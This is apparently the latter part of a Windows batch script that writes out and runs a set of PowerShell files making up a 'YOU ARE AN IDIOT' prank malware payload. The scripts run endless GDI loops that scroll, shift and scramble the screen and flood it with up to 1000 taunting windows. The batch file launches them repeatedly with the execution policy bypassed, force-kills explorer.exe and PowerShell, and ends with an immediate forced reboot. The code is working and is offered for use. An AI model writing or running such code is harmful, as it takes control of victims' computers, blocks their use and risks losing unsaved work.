echo             ReleaseDC(IntPtr.Zero, hdc);                                                                                                           >> rainbow.ps1
echo             System.Threading.Thread.Sleep(10);                                                                                                     >> rainbow.ps1
echo         }                                                                                                                                          >> rainbow.ps1
echo     }                                                                                                                                              >> rainbow.ps1
echo     [DllImport("user32.dll")]                                                                                                                      >> rainbow.ps1
echo     public static extern int GetSystemMetrics(int nIndex);                                                                                         >> rainbow.ps1
echo }                                                                                                                                                  >> rainbow.ps1
echo ^"@                                                                                                                                                >> rainbow.ps1
echo [PatBlt3]::RunPatBlt3()                                                                                                                            >> rainbow.ps1

echo Add-Type -TypeDefinition @^" 																																> screanleft.ps1
echo using System;                                                                                                                                              >> screanleft.ps1
echo using System.Runtime.InteropServices;                                                                                                                      >> screanleft.ps1
echo public class GraphicsHelper                                                                                                                                >> screanleft.ps1
echo {                                                                                                                                                          >> screanleft.ps1
echo     [DllImport("user32.dll")]                                                                                                                              >> screanleft.ps1
echo     public static extern IntPtr GetDC(IntPtr hwnd);                                                                                                        >> screanleft.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                               >> screanleft.ps1
echo     public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);    >> screanleft.ps1
echo     [DllImport("user32.dll")]                                                                                                                              >> screanleft.ps1
echo     public static extern int GetSystemMetrics(int smIndex);                                                                                                >> screanleft.ps1
echo     [DllImport("user32.dll")]                                                                                                                              >> screanleft.ps1
echo     public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);                                                                                           >> screanleft.ps1
echo     public static void SlideGraphicsEffect()                                                                                                               >> screanleft.ps1
echo     {                                                                                                                                                      >> screanleft.ps1
echo         int screenWidth = GetSystemMetrics(0);                                                                                                             >> screanleft.ps1
echo         int screenHeight = GetSystemMetrics(1);                                                                                                            >> screanleft.ps1
echo         while (true)                                                                                                                                       >> screanleft.ps1
echo         {                                                                                                                                                  >> screanleft.ps1
echo             IntPtr hdc = GetDC(IntPtr.Zero);                                                                                                               >> screanleft.ps1
echo             BitBlt(hdc, -5, 0, screenWidth, screenHeight, hdc, 0, 0, 0xCC0020);                                                                            >> screanleft.ps1
echo             BitBlt(hdc, screenWidth - 5, 0, screenWidth, screenHeight, hdc, 0, 0, 0xCC0020);                                                               >> screanleft.ps1
echo             ReleaseDC(IntPtr.Zero, hdc);                                                                                                                   >> screanleft.ps1
echo             System.Threading.Thread.Sleep(10);                                                                                                             >> screanleft.ps1
echo         }                                                                                                                                                  >> screanleft.ps1
echo     }                                                                                                                                                      >> screanleft.ps1
echo }                                                                                                                                                          >> screanleft.ps1
echo ^"@                                                                                                                                                        >> screanleft.ps1
echo [GraphicsHelper]::SlideGraphicsEffect()                                                                                                                    >> screanleft.ps1

echo Add-Type -TypeDefinition @^"                                                        																			> screanup.ps1                                                                                
echo using System;                                                                                                                                                  >> screanup.ps1     
echo using System.Runtime.InteropServices;                                                                                                                          >> screanup.ps1     
echo public class GraphicsHelper2                                                                                                                                   >> screanup.ps1     
echo {                                                                                                                                                              >> screanup.ps1     
echo     [DllImport("user32.dll")]                                                                                                                                  >> screanup.ps1     
echo     private static extern IntPtr GetDC(IntPtr hwnd);                                                                                                           >> screanup.ps1     
echo     [DllImport("user32.dll")]                                                                                                                                  >> screanup.ps1     
echo     private static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);                                                                                              >> screanup.ps1     
echo     [DllImport("gdi32.dll")]                                                                                                                                   >> screanup.ps1     
echo     private static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);        >> screanup.ps1     
echo     public static void ScrollGraphicsDown()                                                                                                                    >> screanup.ps1     
echo     {                                                                                                                                                          >> screanup.ps1     
echo         IntPtr desktopPtr = GetDC(IntPtr.Zero);                                                                                                                >> screanup.ps1     
echo         IntPtr destDC = CreateCompatibleDC(desktopPtr);                                                                                                        >> screanup.ps1     
echo         int screenWidth = GetSystemMetrics(0);                                                                                                                 >> screanup.ps1     
echo         int screenHeight = GetSystemMetrics(1);                                                                                                                >> screanup.ps1     
echo         IntPtr hBitmap = IntPtr.Zero;                                                                                                                          >> screanup.ps1     
echo         IntPtr hOldBitmap = IntPtr.Zero;                                                                                                                       >> screanup.ps1     
echo         try                                                                                                                                                    >> screanup.ps1     
echo         {                                                                                                                                                      >> screanup.ps1     
echo             hBitmap = CreateCompatibleBitmap(desktopPtr, screenWidth, screenHeight);                                                                           >> screanup.ps1     
echo             hOldBitmap = SelectObject(destDC, hBitmap);                                                                                                        >> screanup.ps1     
echo             int scrollAmount = 4;                                                                                                                              >> screanup.ps1     
echo             while (true)                                                                                                                                       >> screanup.ps1     
echo             {                                                                                                                                                  >> screanup.ps1     
echo                 BitBlt(destDC, 0, 0, screenWidth, screenHeight - scrollAmount, desktopPtr, 0, scrollAmount, 0x00CC0020);                                       >> screanup.ps1     
echo                 BitBlt(desktopPtr, 0, 0, screenWidth, screenHeight, destDC, 0, 0, 0x00CC0020);                                                                 >> screanup.ps1     
echo             }                                                                                                                                                  >> screanup.ps1     
echo         }                                                                                                                                                      >> screanup.ps1     
echo         finally                                                                                                                                                >> screanup.ps1     
echo         {                                                                                                                                                      >> screanup.ps1     
echo             if (hOldBitmap ^!= IntPtr.Zero)                                                                                                                    >> screanup.ps1     
echo                 SelectObject(destDC, hOldBitmap);                                                                                                              >> screanup.ps1     
echo             if (hBitmap ^!= IntPtr.Zero)                                                                                                                       >> screanup.ps1     
echo                 DeleteObject(hBitmap);                                                                                                                         >> screanup.ps1     
echo             ReleaseDC(IntPtr.Zero, desktopPtr);                                                                                                                >> screanup.ps1     
echo             ReleaseDC(IntPtr.Zero, destDC);                                                                                                                    >> screanup.ps1     
echo         }                                                                                                                                                      >> screanup.ps1     
echo     }                                                                                                                                                          >> screanup.ps1     
echo     [DllImport("gdi32.dll")]                                                                                                                                   >> screanup.ps1     
echo     private static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);                                                                  >> screanup.ps1     
echo     [DllImport("gdi32.dll")]                                                                                                                                   >> screanup.ps1     
echo     private static extern IntPtr CreateCompatibleDC(IntPtr hdc);                                                                                               >> screanup.ps1     
echo     [DllImport("gdi32.dll")]                                                                                                                                   >> screanup.ps1     
echo     private static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);                                                                                     >> screanup.ps1     
echo     [DllImport("gdi32.dll")]                                                                                                                                   >> screanup.ps1     
echo     private static extern bool DeleteObject(IntPtr hObject);                                                                                                   >> screanup.ps1     
echo     [DllImport("user32.dll")]                                                                                                                                  >> screanup.ps1     
echo     private static extern int GetSystemMetrics(int nIndex);                                                                                                    >> screanup.ps1     
echo }                                                                                                                                                              >> screanup.ps1     
echo ^"@                                                                                                                                                            >> screanup.ps1     
echo [GraphicsHelper2]::ScrollGraphicsDown()                                                                                                                        >> screanup.ps1     

echo Add-Type -AssemblyName System.Windows.Forms    																																		> letter.ps1
echo Add-Type -AssemblyName System.Drawing                                                                                                                                                  >> letter.ps1
echo while ($true) {                                                                                                                                                                        >> letter.ps1
echo     for ($i = 1; $i -le 20; $i++) {                                                                                                                                                    >> letter.ps1
echo         $form = New-Object System.Windows.Forms.Form                                                                                                                                   >> letter.ps1
echo         $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None                                                                                                           >> letter.ps1
echo         $form.StartPosition = "Manual"                                                                                                                                                 >> letter.ps1
echo         $form.Top = Get-Random -Minimum 0 -Maximum ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height - 100)                                                                  >> letter.ps1
echo         $form.Left = Get-Random -Minimum 0 -Maximum ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width - 200)                                                                  >> letter.ps1
echo         $form.Size = New-Object System.Drawing.Size(430, 50)                                                                                                                           >> letter.ps1
echo         $form.ShowInTaskbar = $false  # 작업 표시줄에 나타나지 않도록 설정                                                                                                                            >> letter.ps1
echo         $label = New-Object System.Windows.Forms.Label                                                                                                                                 >> letter.ps1
echo         $label.AutoSize = $true                                                                                                                                                        >> letter.ps1
echo         $label.Font = New-Object System.Drawing.Font("Segoe UI", 30, [System.Drawing.FontStyle]::Bold)                                                                                 >> letter.ps1
echo         $label.ForeColor = [System.Drawing.Color]::FromArgb((Get-Random -Minimum 0 -Maximum 256), (Get-Random -Minimum 0 -Maximum 256), (Get-Random -Minimum 0 -Maximum 256))          >> letter.ps1
echo         $label.Text = "YOU ARE AN IDIOT"                                                                                                                                               >> letter.ps1
echo         $form.Controls.Add($label)                                                                                                                                                     >> letter.ps1
echo         $form.Show()                                                                                                                                                                   >> letter.ps1
echo         Start-Sleep -Seconds 1                                                                                                                                                         >> letter.ps1
echo     }                                                                                                                                                                                  >> letter.ps1
echo     $openForms = [System.Windows.Forms.Application]::OpenForms                                                                                                                         >> letter.ps1
echo     foreach ($form in $openForms) {                                                                                                                                                    >> letter.ps1
echo         $form.Close()                                                                                                                                                                  >> letter.ps1
echo     }                                                                                                                                                                                  >> letter.ps1
echo }                                                                                                                                                                                      >> letter.ps1

echo Add-Type -TypeDefinition @^"																																> evesa.ps1
echo using System;                                                                                                                                              >> evesa.ps1
echo using System.Runtime.InteropServices;                                                                                                                      >> evesa.ps1
echo public class Shuffle                                                                                                                                       >> evesa.ps1
echo {                                                                                                                                                          >> evesa.ps1
echo     [DllImport("user32.dll")]                                                                                                                              >> evesa.ps1
echo     public static extern IntPtr GetDC(IntPtr hwnd);                                                                                                        >> evesa.ps1
echo     [DllImport("user32.dll")]                                                                                                                              >> evesa.ps1
echo     public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);                                                                                           >> evesa.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                               >> evesa.ps1
echo     public static extern int BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);     >> evesa.ps1
echo     public static void RunShuffle()                                                                                                                        >> evesa.ps1
echo     {                                                                                                                                                      >> evesa.ps1
echo         Random rand = new Random();                                                                                                                        >> evesa.ps1
echo         int sw = (int)GetSystemMetrics(0);                                                                                                                 >> evesa.ps1
echo         int sh = (int)GetSystemMetrics(1);                                                                                                                 >> evesa.ps1
echo         while (true)                                                                                                                                       >> evesa.ps1
echo         {                                                                                                                                                  >> evesa.ps1
echo             IntPtr hdc = GetDC(IntPtr.Zero);                                                                                                               >> evesa.ps1
echo             int a = rand.Next() %% sw;                                                                                                                     >> evesa.ps1
echo             int b = rand.Next() %% sh;                                                                                                                     >> evesa.ps1
echo             BitBlt(hdc, a, b, -1000, 1000, hdc, a + rand.Next() %% 21 - 10, b + rand.Next() %% 21 - 10, 0xCC0020);                                         >> evesa.ps1
echo             ReleaseDC(IntPtr.Zero, hdc);                                                                                                                   >> evesa.ps1
echo         }                                                                                                                                                  >> evesa.ps1
echo     }                                                                                                                                                      >> evesa.ps1
echo     [DllImport("user32.dll")]                                                                                                                              >> evesa.ps1
echo     public static extern int GetSystemMetrics(int nIndex);                                                                                                 >> evesa.ps1
echo }                                                                                                                                                          >> evesa.ps1
echo ^"@                                                                                                                                                        >> evesa.ps1
echo [Shuffle]::RunShuffle()                                                                                                                                    >> evesa.ps1
                               
echo Add-Type -TypeDefinition @^"																																		> 32gca.ps1
echo using System;                                                                                                                                                      >> 32gca.ps1
echo using System.Runtime.InteropServices;                                                                                                                              >> 32gca.ps1
echo public class Shuffle                                                                                                                                               >> 32gca.ps1
echo {                                                                                                                                                                  >> 32gca.ps1
echo     [DllImport("user32.dll")]                                                                                                                                      >> 32gca.ps1
echo     public static extern IntPtr GetDC(IntPtr hwnd);                                                                                                                >> 32gca.ps1
echo     [DllImport("user32.dll")]                                                                                                                                      >> 32gca.ps1
echo     public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);                                                                                                   >> 32gca.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                       >> 32gca.ps1
echo     public static extern int BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);             >> 32gca.ps1
echo     public static void RunShuffle()                                                                                                                                >> 32gca.ps1
echo     {                                                                                                                                                              >> 32gca.ps1
echo         Random rand = new Random();                                                                                                                                >> 32gca.ps1
echo         int sw = (int)GetSystemMetrics(0);                                                                                                                         >> 32gca.ps1
echo         int sh = (int)GetSystemMetrics(1);                                                                                                                         >> 32gca.ps1
echo         while (true)                                                                                                                                               >> 32gca.ps1
echo         {                                                                                                                                                          >> 32gca.ps1
echo             IntPtr hdc = GetDC(IntPtr.Zero);                                                                                                                       >> 32gca.ps1
echo             int a = rand.Next() %% sw;                                                                                                                             >> 32gca.ps1
echo             int b = rand.Next() %% sh;                                                                                                                             >> 32gca.ps1
echo             BitBlt(hdc, a, b, 1000, -1000, hdc, a + rand.Next() %% 21 - 10, b + rand.Next() %% 21 - 10, 0xCC0020);                                                 >> 32gca.ps1
echo             ReleaseDC(IntPtr.Zero, hdc);                                                                                                                           >> 32gca.ps1
echo         }                                                                                                                                                          >> 32gca.ps1
echo     }                                                                                                                                                              >> 32gca.ps1
echo     [DllImport("user32.dll")]                                                                                                                                      >> 32gca.ps1
echo     public static extern int GetSystemMetrics(int nIndex);                                                                                                         >> 32gca.ps1
echo }                                                                                                                                                                  >> 32gca.ps1
echo ^"@                                                                                                                                                                >> 32gca.ps1
echo [Shuffle]::RunShuffle()                                                                                                                                            >> 32gca.ps1

echo Add-Type -AssemblyName System.Windows.Forms																		> mssage.ps1
echo for ($i = 1; $i -le 1000; $i++) {                                                                                   >> mssage.ps1
echo     $screenWidth = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width                                       >> mssage.ps1
echo     $screenHeight = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height                                     >> mssage.ps1
echo     $randomX = Get-Random -Minimum 0 -Maximum $screenWidth                                                         >> mssage.ps1
echo     $randomY = Get-Random -Minimum 0 -Maximum $screenHeight                                                        >> mssage.ps1
echo     $form = New-Object System.Windows.Forms.Form                                                                   >> mssage.ps1
echo     $form.Text = "YOU ARE AN IDIOT"                                                                                >> mssage.ps1
echo     $form.Size = New-Object System.Drawing.Size(240, 80)                                                           >> mssage.ps1
echo     $form.StartPosition = "Manual"                                                                                 >> mssage.ps1
echo     $form.Location = New-Object System.Drawing.Point($randomX, $randomY)                                           >> mssage.ps1
echo     $label = New-Object System.Windows.Forms.Label                                                                 >> mssage.ps1
echo     $label.Text = "YOU ARE AN IDIOT"                                                                               >> mssage.ps1
echo     $label.AutoSize = $true                                                                                        >> mssage.ps1
echo     $label.Font = New-Object System.Drawing.Font("Arial", 16, [System.Drawing.FontStyle]::Bold)  # 두꺼운 글꼴 설정       >> mssage.ps1
echo     $label.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter                                             >> mssage.ps1
echo     $label.Dock = [System.Windows.Forms.DockStyle]::Fill                                                           >> mssage.ps1
echo     $form.Controls.Add($label)                                                                                     >> mssage.ps1
echo     $form.Show()                                                                                                   >> mssage.ps1
echo }                                                                                                                  >> mssage.ps1

echo { YOU ARE AN IDIOT  YOU ARE AN IDIOT YOU ARE AN IDIOT YOU ARE AN IDIOT } > YOUAREANIDIOT.txt
echo { YOU ARE AN IDIOT YOU ARE AN IDIOT YOU ARE AN IDIOT YOU ARE AN IDIOT} >> YOUAREANIDIOT.txt
echo { YOU ARE AN IDIOT YOU ARE AN IDIOT YOU ARE AN IDIOT YOU ARE AN IDIOT} >> YOUAREANIDIOT.txt
echo { YOU ARE AN IDIOT YOU ARE AN IDIOT YOU ARE AN IDIOT YOU ARE AN IDIOT} >> YOUAREANIDIOT.txt
echo { YOU ARE AN IDIOT YOU ARE AN IDIOT YOU ARE AN IDIOT YOU ARE AN IDIOT} >> YOUAREANIDIOT.txt
echo { YOU ARE AN IDIOT YOU ARE AN IDIOT YOU ARE AN IDIOT YOU ARE AN IDIOT} >> YOUAREANIDIOT.txt
echo { YOU ARE AN IDIOT YOU ARE AN IDIOT YOU ARE AN IDIOT YOU ARE AN IDIOT} >> YOUAREANIDIOT.txt
echo { YOU ARE AN IDIOT YOU ARE AN IDIOT YOU ARE AN IDIOT YOU ARE AN IDIOT} >> YOUAREANIDIOT.txt
echo { YOU ARE AN IDIOT YOU ARE AN IDIOT YOU ARE AN IDIOT YOU ARE AN IDIOT} >> YOUAREANIDIOT.txt
:: start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiot3.ps1'" 

::start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\benben.ps1'" 

::start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotbeat.ps1'" 

::start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotdance.ps1'" 

::start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\screanmove.ps1'" 

::start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\light.ps1'" 

::start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\rainbow.ps1'" 

::start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\screanleft.ps1'" 

::start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\screanup.ps1'" 
::start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\evesa.ps1'" 
::start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\32gca.ps1'" 

taskkill /f /im explorer.exe & start explorer.exe
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\light.ps1'" 
timeout 1
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\light.ps1'" 
timeout 1
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\benben.ps1'" 
timeout 2
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotbeat.ps1'" 
timeout 1
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotbeat.ps1'" 
timeout 2
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotbeat.ps1'" 
timeout 2
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\light.ps1'" 
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotbeat.ps1'" 
timeout 1
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotbeat.ps1'" 
timeout 2
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotbeat.ps1'" 
timeout 2
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\screanleft.ps1'" 
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotbeat.ps1'" 
timeout 2
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\light.ps1'" 
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\light.ps1'" 
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotbeat.ps1'" 
timeout 2
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotbeat.ps1'" 
timeout 1
start msedge.exe https://media.tenor.com/jcP81VCwMvYAAAAC/you-are-an-idiot-fighting.gif
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotbeat.ps1'" 
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\light.ps1'" 
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotbeat.ps1'" 
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotbeat.ps1'" 
timeout 2
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\light.ps1'" 
timeout 1
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotbeat.ps1'" 
timeout 1
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotbeat.ps1'" 
timeout 1
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotbeat.ps1'" 
timeout 2
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\screanmove.ps1'" 
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotdance.ps1'" 
timeout 2
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\light.ps1'" 
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\letter.ps1'" 
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotdance.ps1'" 
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotdance.ps1'" 
timeout 2
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotdance.ps1'" 
timeout 2
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotdance.ps1'" 
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\light.ps1'" 
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotdance.ps1'" 
timeout 2
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\light.ps1'" 
timeout 2
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotdance.ps1'" 
timeout 2
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotdance.ps1'" 
timeout 2
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotdance.ps1'" 
timeout 2
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotdance.ps1'" 
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotdance.ps1'" 
timeout 2
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\light.ps1'" 
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotdance.ps1'" 
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotdance.ps1'" 
timeout 2

taskkill /f /im powershell.exe & start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\rainbow.ps1'" 
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\screanup.ps1'" 
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\letter.ps1'" 
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\letter.ps1'" 
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\ben.ps1'" 
timeout 10

start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiot3.ps1'" 
timeout 1
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotbeat.ps1'" 
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotbeat.ps1'" 

start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\32gca.ps1'" 
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\evesa.ps1'" 
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotbeat.ps1'" 

start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiot3.ps1'" 
timeout 1
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiot3.ps1'" 
timeout 1
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiot3.ps1'" 
timeout 1
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotbeat.ps1'" 
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotbeat.ps1'" 
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotbeat.ps1'" 
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiot3.ps1'" 
timeout 1
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiot3.ps1'" 
timeout 1
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiot3.ps1'" 
timeout 1

start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotdance.ps1'" 
timeout 2
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\screanleft.ps1'" 
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotdance.ps1'" 
timeout 2
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotdance.ps1'" 
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotdance.ps1'" 
timeout 2
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotdance.ps1'" 
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotdance.ps1'" 
timeout 2

timeout 10
taskkill /f /im explorer.exe
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\letter.ps1'" 
timeout 1
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotbeat.ps1'" 
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotbeat.ps1'" 
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotbeat.ps1'" 
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiot3.ps1'" 
timeout 1
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiot3.ps1'" 
timeout 1
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiot3.ps1'" 
timeout 1

start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotdance.ps1'" 
timeout 2
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\screanleft.ps1'" 
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotdance.ps1'" 
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiot3.ps1'" 
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiot3.ps1'" 
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiot3.ps1'" 
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiot3.ps1'" 
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiot3.ps1'" 
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiot3.ps1'" 
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiot3.ps1'" 
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiot3.ps1'" 
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiot3.ps1'" 
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiot3.ps1'" 
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiot3.ps1'" 
timeout 2
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotdance.ps1'" 
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotdance.ps1'" 
timeout 2
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotdance.ps1'" 
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\idiotdance.ps1'" 
timeout 5
taskkill /f /im powershell.exe
start /b PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%appdata%\ren\mssage.ps1'" 
timeout 20
shutdown -r -t 0
